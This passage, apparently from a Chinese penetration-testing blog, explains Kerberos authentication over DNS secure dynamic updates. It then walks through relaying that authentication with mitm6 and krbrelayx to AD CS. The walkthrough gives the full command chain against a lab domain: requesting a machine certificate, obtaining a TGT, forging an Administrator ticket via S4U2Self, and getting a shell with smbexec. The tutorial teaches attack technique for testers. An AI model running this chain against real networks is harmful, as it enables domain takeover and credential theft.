AP_REP，客户端可以假定它是一个欺骗服务器并拒绝与其继续通信。
从中继的角度来看，相互身份验证并不重要，因为中继攻击的目标是服务器，而不是客户端。目标服务器在接受 AP_REQ
后将假定身份验证已完成，因此这就是攻击者需要转发的全部内容。虽然服务器将生成 AP_REP
并将其返回给攻击者，但他们可以直接丢弃它，除非他们出于某种原因需要中继客户端继续参与通信。
## Kerberos over DNS
DNS 是一个拥有有效 Kerberos 基础架构的关键组件。在 Active Directory 中，DNS 支持使用 Kerberos 在 DNS
上进行身份验证的操作。这是 “[Secure Dynamic Update](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961412\(v=technet.10)?redirectedfrom=MSDN)”
操作的一部分，用于使具有动态地址的网络客户端的 DNS 记录在其网络状态发生更改时能与其当前的 IP 地址保持同步。下图中显示了 DNS
动态更新过程中涉及的几个步骤：
（1）在步骤 1 中，客户端查询本地名称服务器以确定哪个服务器对其所处的区域具有权威性。本地名称服务器以区域名称和对该区域具有权威性的主服务器地址进行响应。
（2）在步骤 2
中，客户端尝试进行非安全更新。由于该区域被配置为安全动态更新，因此权威名称服务器将对客户端的更新请求进行拒绝。如果该区域被配置为非安全动态更新，则服务器将尝试添加、删除或修改
Active Directory 中的资源记录。
（3）在步骤 3 中，客户端和服务器开始 TKEY 协商。首先，客户端和服务器协商底层安全机制。由于 Windows 2000
动态更新客户端和服务器都提出了 Kerberos 协议，因此他们决定使用它。接下来，客户端和服务器将使用 Kerberos
安全机制，验证彼此的身份并建立安全上下文。
（4）在步骤 4 中，经过身份验证后的客户端再次向服务器发送动态更新请求，并使用在步骤 3 中建立的安全上下文生成的 TSIG 密钥进行签名。DNS
服务器使用安全上下文和 TSIG 密钥验证动态更新数据包的来源。
（5）在步骤 5 中，服务器开始尝试在 Active Directory
中添加、删除或修改资源记录。它是否可以进行更新取决于客户端是否具有进行更新的适当权限以及是否满足先决条件。
（6）在步骤 6 中，服务器向客户端发送回复，说明它是否能够进行更新，并使用 TSIG 密钥签名。如果客户端收到欺骗性回复，它会将其丢弃并等待签名回复。
让我们通过 WireShark 抓包来观察一下该过程：
让我们仔细看看第 83 和第 84 个数据包。TKEY 协商消息实际上是通过 TCP 进行发送的，因为它比 UDP 允许的最大 512
字节大很多。这主要是因为其中包含了相当大的 TKEY 附加记录，比如我们经常看到的用于 Kerberos 身份验证的结构：
可以看到，此查询中包含了一个完整的 GSS-API 和 SPNEGO 结构，其中包含 Kerberos AP-REQ，其实质是对服务的正常 Kerberos
身份验证流程。服务器的应答消息中将返回一个 GSSAPI 和 SPNEGO 结构，其中包含了 Kerberos AP-REP，以指示认证成功，如下图诉所示。此 AP-REP 包含一个 TSIG 会话密钥，客户端可以使用该密钥进一步签署其 DNS 更新查询。
服务器可以存储密钥和经过身份验证的用户/计算机，并以经过身份验证的方式处理更新，而不必将身份验证绑定到特定的 TCP 套接字，因为以后的查询可能通过 UDP
发送。
## Abusing DNS authentication
如果我们能够拦截 DNS 查询，就有可能欺骗受害客户端向我们发送本应发给真实 DNS 服务器的 Kerberos 认证票据。这种拦截可以在 Windows
默认配置中，由同一 (V)LAN 中的任何系统上通过 [mitm6](https://github.com/dirkjanm/mitm6)
工具完成。Mitm6 将自己宣称为 DNS 服务器（详情请看：[《使用 MITM6 中继 WPAD
身份验证》](https://whoamianony.top/relaying-wpad-authentication-using-mitm6/)），这意味着受害者将向我们发送 `SOA` 请求，如果我们拒绝他们的动态更新，则客户端会使用 Kerberos 进行身份验证。
到这里可能就有点棘手了，前文中我们曾说过，用于 Kerberos 身份验证的 SPN 通常由目标服务器的主机名定义。通常 DNS
服务器角色将在域控制器上运行，因此 DNS 服务的服务票证将由 SPN 名称绑定在 DC 上运行的服务。但是我们可以更改票证中的 SPN
名称，这意味着我们可以将此票据中继到例如 LDAP 等其他服务上。
此外，正如 James Forshaw 在他其文章中所描述的，许多服务类实际上会隐式映射到 HOST 类。事实证明，这包括 DNS，因此当我们的受害者请求
DNS 服务的票证时，这实际上适用于具有 HOST SPN 的任何帐户。由于 HOST SPN
是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
此外，中继的另一个难题是签名和消息完整性保护的问题。但是，正如前文中所描述的，其他服务（例如 HTTP）通常不支持签名。并且，Lee Christensen
和 Will Schroeder 关于 AD CS 服务研究为我们提供了一个可用的高价值 HTTP 端点。由于 AD CS 的证书颁发机构 Web
注册接口支持 Kerberos 身份验证，并且不支持签名保护，因此测试人员可以将假 DNS 服务器上收到的 Kerberos 身份验证中继到 AD CS
服务。完成后，我们可以为我们中继的计算机帐户申请 AD 证书，并使用我在之前的[博客](https://whoamianony.top/attack-surface-mining-for-ad-cs/)中谈到的 NTLM 哈希恢复或 S4U2Self 技术。使用这些技术，我们可以 SYSTEM
权限威胁受害计算机。
## Changes to krbrelayx and mitm6
最初，[krbrelayx](https://github.com/dirkjanm/krbrelayx)
并不是真正用来中继的工具。相反，它通过使用非约束性委派来捕获 Kerberos TGT，并使用这些 TGT 执行 Kerberos
身份验证。由于现在有一个实际中继 Kerberos 身份验证的用例，因此 Dirk-jan Mollema 更新了 krbrelayx
中的功能，使其可以在真正的中继模式下运行，但仅支持中继到 HTTP 和 LDAP。至于 mitm6，Dirk-jan 添加了指定认证目标的选项，当受害者询问
SOA 记录时，这将是权威性名称服务器响应中的主机名。这将使受害者为我们的目标服务器而不是合法的 DNS 服务器请求 Kerberos 服务票据。
## Attack example
（1）首先执行以下命令设置 krbrelayx，将 AD CS 主机（adcs.pentest.com）指定为中继的目标，并将接口的 IPv4
地址指定为绑定 DNS 服务器的接口。
    python3 krbrelayx.py --target http://adcs.pentest.com/certsrv/ -ip 172.26.10.134 --victim win10-client1.pentest.com --adcs --template Machine
（2）然后执行以下命令设置 mitm6，使用 AD CS 主机的名称作为认证目标：
    mitm6 --domain pentest.com --host-allowlist win10-client1.pentest.com --relay adcs.pentest.com -i eth0 -v
现在，我们可以等待受害者获得 IPv6 地址并连接到我们的恶意服务器。如下图所示，成功为机器账户 `WIN10-CLIENT1$`
的申请到了证书，该证书适用 Base64 加密。
（3）我们将该证书的内容保存在 win10-client1.txt 文件中，有了这个证书，我们可以使用
[PKINITtools](https://github.com/dirkjanm/PKINITtools) 或
[Rubeus](https://github.com/GhostPack/Rubeus) 工具，代表该机器账户执行 Kerberos 身份验证，并为其申请
TGT 票据：
    python3 gettgtpkinit.py pentest.com/win10-client1\$ win10-client1.ccache -pfx-base64 $(cat win10-client1.txt)
（4）至此我们已经获取了 TGT 票据，但是该票据为 WIN10-CLIENT1
机器账户的票据。由于机器账户不允许登录，我们无法通过机器账户对目标主机执行交互式操作。不过我们可以通过 Kerberos 的 S4U2Self
扩展协议，使用已获取的 TGT 为域管理员用户申请针对 `cifs/PI:EMAIL` SPN
的服务票据，相关命令如下：
> 尽管需要在机器帐户上专门启用约束委派属性才能使 S4U2proxy 跨系统工作，但是任何具有 SPN 的主体都可以调用 S4U2self
> 去获取针对自身的高权限票据。
    python3 gets4uticket.py kerberos+ccache://pentest.com\\win10-client1\$:PI:EMAIL cifs/PI:EMAIL PI:EMAIL Administrator.ccache -v
（5）最后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 smbexec.py 获取
WIN10-CLIENT1 机器的最高权限，相关命令如下。
    export KRB5CCNAME=/root/PKINITtools/Administrator.ccache
    python3 smbexec.py -k pentest.com/PI:EMAIL -no-pass
## Ending......
参考文献：
>  authentication-relay.html>
>
> 